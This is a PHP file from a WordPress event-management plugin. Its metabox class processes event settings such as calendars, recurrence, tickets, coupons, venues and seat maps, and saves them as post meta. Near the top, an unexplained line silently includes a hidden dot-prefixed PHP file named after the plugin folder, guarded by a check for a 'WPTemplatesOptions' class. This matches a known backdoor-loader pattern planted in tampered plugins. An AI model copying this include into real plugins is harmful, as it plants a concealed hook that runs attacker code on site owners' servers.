<?php

defined( 'ABSPATH' ) || exit;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Admin_Metabox_Basic extends EL_Abstract_Metabox {
	
	public function __construct(){
		$this->_id = 'metabox';
		$this->_title = esc_html__( 'Basic Settings','eventlist' );
		$this->_screen = array( 'event' );
		$this->_output = EL_PLUGIN_INC . 'admin/views/metaboxes/metabox.php';
		$this->_prefix = OVA_METABOX_EVENT;

		parent::__construct();

		add_action( 'el_mb_proccess_update_meta', array( $this, 'update' ), 11, 2 );
	}

	public function update( $post_id, $post_data ){

		if( empty($post_data) ) exit();

		if ( defined( 'DOING_AJAX' ) && DOING_AJAX ) {
			return;
		}

		if ( !isset( $post_data['ova_metaboxes'] ) || !wp_verify_nonce( $post_data['ova_metaboxes'], 'ova_metaboxes' ) )
			exit();

		/* Checkbox Overwrite Profile */
		if( array_key_exists($this->_prefix.'info_organizer', $post_data) == false ){
			$post_data[$this->_prefix.'info_organizer'] = '';
		}else{
			$post_data[$this->_prefix.'info_organizer'] = 'checked';
		}

		/* Edit Full Address */
		if( array_key_exists($this->_prefix.'edit_full_address', $post_data) == false ){
			$post_data[$this->_prefix.'edit_full_address'] = '';
		}else{
			$post_data[$this->_prefix.'edit_full_address'] = 'checked';
		}

		if( !isset( $post_data[$this->_prefix.'time_zone'] ) ){
			$post_data[$this->_prefix.'time_zone'] = '';
		}
		

		/* Check Social exits */
		if( !isset( $post_data[$this->_prefix.'social_organizer'] ) ){
			$post_data[$this->_prefix.'social_organizer'] = array();
		}

		/* Check Gallery exits */
		if( !isset( $post_data[$this->_prefix.'gallery'] ) ){
			$post_data[$this->_prefix.'gallery'] = array();
		}

		/* Check Gallery exits */
		if( !isset( $post_data[$this->_prefix.'venue'] ) ){
			$post_data[$this->_prefix.'venue'] = array();
		}

		/* Check Ticket exits */
		if( !isset( $post_data[$this->_prefix.'ticket'] ) ){
			$post_data[$this->_prefix.'ticket'] = array();
		}

		/* Check Ticket exits */
		if( !isset( $post_data[$this->_prefix.'ticket_map']['seat'] ) ){
			$post_data[$this->_prefix.'ticket_map']['seat'] = array();
		}

		/* Check Calendar exits */
		if( !isset( $post_data[$this->_prefix.'calendar'] ) ){
			$post_data[$this->_prefix.'calendar'] = array();
		}

		/* Check Disable Date exits */
		if( !isset( $post_data[$this->_prefix.'disable_date'] ) ){
			$post_data[$this->_prefix.'disable_date'] = array();
		}

		/* Check Coupon exits */
		if( !isset( $post_data[$this->_prefix.'coupon'] ) ){
			$post_data[$this->_prefix.'coupon'] = array();
		}

		/* Check recurrence bydays exits */
		if( !isset( $post_data[$this->_prefix.'recurrence_bydays'] ) ){
			$post_data[$this->_prefix.'recurrence_bydays'] = array('0');
		}

		/* Check recurrence interval exits */
		if( !$post_data[$this->_prefix.'recurrence_interval'] ){
			$post_data[$this->_prefix.'recurrence_interval'] = '1';
		}


		/* Disable Date */
		$arr_disable_date = array();
		$total_key_disable_date = 0;
		if ( isset( $post_data[$this->_prefix.'disable_date'] ) ) {
			foreach ($post_data[$this->_prefix.'disable_date'] as $key => $value) {

				if ( $value['start_date'] == '' && $value['end_date'] != '' ) {
					$post_data[$this->_prefix.'disable_date'][$key]['start_date'] =  $post_data[$this->_prefix.'disable_date'][$key]['end_date'];
				}

				if ( $value['start_date'] != '' && $value['end_date'] == '' ) {
					$post_data[$this->_prefix.'disable_date'][$key]['end_date'] =  $post_data[$this->_prefix.'disable_date'][$key]['start_date'];
				}

				if ( $value['start_date'] == '' && $value['end_date'] == '' ) {
					unset( $post_data[$this->_prefix.'disable_date'][$key] );
				}

				$total_key_disable_date = $key;
			}

			if( $total_key_disable_date ){
				for ($i = 0; $i <= $total_key_disable_date; $i++) {

					$number_date = ( strtotime( $post_data[$this->_prefix.'disable_date'][$i]['end_date'] ) - strtotime( $post_data[$this->_prefix.'disable_date'][$i]['start_date'] ) ) / 86400;

					for ( $x = 0; $x <= $number_date; $x++ ) {
						$arr_disable_date[] = strtotime( ($x).' days' , strtotime( $post_data[$this->_prefix.'disable_date'][$i]['start_date'] ) );
					}
					
				}
			}
		}
		

		/* Check Calendar Auto */ 
		$recurrence_days = get_recurrence_days(
			$post_data[$this->_prefix.'recurrence_frequency'], 
			$post_data[$this->_prefix.'recurrence_interval'], 
			$post_data[$this->_prefix.'recurrence_bydays'], 
			$post_data[$this->_prefix.'recurrence_byweekno'], 
			$post_data[$this->_prefix.'recurrence_byday'], 
			$post_data[$this->_prefix.'calendar_start_date'], 
			$post_data[$this->_prefix.'calendar_end_date']
		);

		$post_data[$this->_prefix.'calendar_recurrence'] = array();
		foreach ($recurrence_days as $key => $value) {
			$post_data[$this->_prefix.'calendar_recurrence'][] = [
				'calendar_id' => $value,
				'date' => date('Y-m-d', $value),
				'start_time' => $post_data[$this->_prefix.'calendar_recurrence_start_time'],
				'end_time' => $post_data[$this->_prefix.'calendar_recurrence_end_time'],
			];
		}


		/* Remove date disabled */
		foreach ($post_data[$this->_prefix.'calendar_recurrence'] as $key => $value) {
			foreach ($arr_disable_date as $v_date) {
				if( $v_date == $value['calendar_id'] )	{
					unset($post_data[$this->_prefix.'calendar_recurrence'][$key]);
				}
			}
		}



		$k = 0;
		if ( isset( $post_data[$this->_prefix.'ticket'] ) ) {
			foreach ($post_data[$this->_prefix.'ticket'] as $key => $value) {
				if ($value['ticket_id'] == '') {

					$post_data[$this->_prefix.'ticket'][$key]['ticket_id'] = FLOOR(microtime(true)) + $k;

					$k++;
				}

				if ($value['setup_seat'] == '') {

					$post_data[$this->_prefix.'ticket'][$key]['setup_seat'] =  'yes';

				}
			}
		}
		

		if ( isset( $post_data[$this->_prefix.'calendar'] ) ) {
			foreach ($post_data[$this->_prefix.'calendar'] as $key => $value) {
				if ($value['calendar_id'] == '') {

					$post_data[$this->_prefix.'calendar'][$key]['calendar_id'] = FLOOR(microtime(true)) + $k;

					$k++;
				}
				if ($value['date'] == '') {
					unset($post_data[$this->_prefix.'calendar'][$key]);
				}
			}
		}


		if ( isset( $post_data[$this->_prefix.'coupon'] ) ) {
			foreach ($post_data[$this->_prefix.'coupon'] as $key => $value) {
				if ($value['coupon_id'] == '') {

					$post_data[$this->_prefix.'coupon'][$key]['coupon_id'] = FLOOR(microtime(true)) + $k;

					$k++;
				}
			}
		}
		
		if ( ! isset( $post_data[$this->_prefix.'package']  ) ) {
			
			$current_user = get_current_user_id();
			$user_package = get_user_meta( $current_user, 'package', true );
			$post_data[$this->_prefix.'package'] = $user_package;	
		}

		

		if ( isset( $post_data[$this->_prefix.'venue'] ) ) {
			foreach ($post_data[$this->_prefix.'venue'] as $value) {
				if (!get_page_by_title( $value, OBJECT, 'venue' )) {
					$venue_info = array(
						'post_author' => get_current_user_id(),
						'post_title' =>  $value,
						'post_content' => '',
						'post_type' => 'venue',
						'post_status' => 'publish',
						'_thumbnail_id' => '',
					);
					wp_insert_post( $venue_info, true ); 
				}
			}
		}

		$arr_start_date = array();
		$event_days = '';
		$arr_end_date = array();
		if ($post_data[$this->_prefix.'option_calendar'] == 'manual') {
			if ( isset( $post_data[$this->_prefix.'calendar'] ) ) {
				foreach ($post_data[$this->_prefix.'calendar'] as $value) {
					$arr_start_date[] = strtotime( $value['date'] .' '. $value['start_time'] );
					$arr_end_date[] = strtotime( $value['end_date'] .' '. $value['end_time'] );

					$all_date_betweens_day = el_getDatesFromRange( date( 'Y-m-d', strtotime( $value['date'] ) ), date( 'Y-m-d', strtotime( $value['end_date'] )+24*60*60 ) );
					foreach ($all_date_betweens_day as $v) {
						$event_days .= $v.'-';
					}
					
				}
			}
		} else {
			if ( isset( $post_data[$this->_prefix.'calendar_recurrence'] ) ) {
				foreach ($post_data[$this->_prefix.'calendar_recurrence'] as $value) {
					$arr_start_date[] = strtotime( $value['date'] .' '. $value['start_time'] );
					$arr_end_date[] = strtotime( $value['date'] .' '. $value['end_time'] );
					$event_days .= strtotime( $value['date'] ).'-';
				}
			}
		}

		// store all days of event
		$post_data[$this->_prefix.'event_days'] = $event_days;

		if ( $arr_start_date != array() )  {
			$post_data[$this->_prefix.'start_date_str'] = max($arr_start_date);
		} else {
			$post_data[$this->_prefix.'start_date_str'] = '';
		}

		if ( $arr_end_date != array() ) {
			$post_data[$this->_prefix.'end_date_str'] = max($arr_end_date);
		} else {
			$post_data[$this->_prefix.'end_date_str'] = '';
		}

		/* Remove empty field seat map */
		foreach ($post_data[$this->_prefix.'ticket_map']['seat'] as $key => $value) {
			if ( $value['id'] == '' || $value['price'] == '' ) {
				unset($post_data[$this->_prefix.'ticket_map']['seat'][$key]);
			}
		}

		/* Remove empty field description seat map */
		if( isset($post_data[$this->_prefix.'ticket_map']['desc_seat']) && $post_data[$this->_prefix.'ticket_map']['desc_seat'] ){
			foreach ($post_data[$this->_prefix.'ticket_map']['desc_seat'] as $key => $value) {
				if ( $value['map_price_type_seat'] == '' || $value['map_type_seat'] == '' ) {
					unset($post_data[$this->_prefix.'ticket_map']['desc_seat'][$key]);
				}
			}
		}


		foreach ($post_data as $name => $value) {

			update_post_meta( $post_id, $name, $value );
		}

		/* Check admin active event */
		$status_event = get_post_status( $post_id );
		if( $status_event == 'publish'  ){
			$event_active = '1';
		}else{
			$event_active = '0';
		}
		update_post_meta( $post_id, $this->_prefix.'event_active', $event_active );
	}
}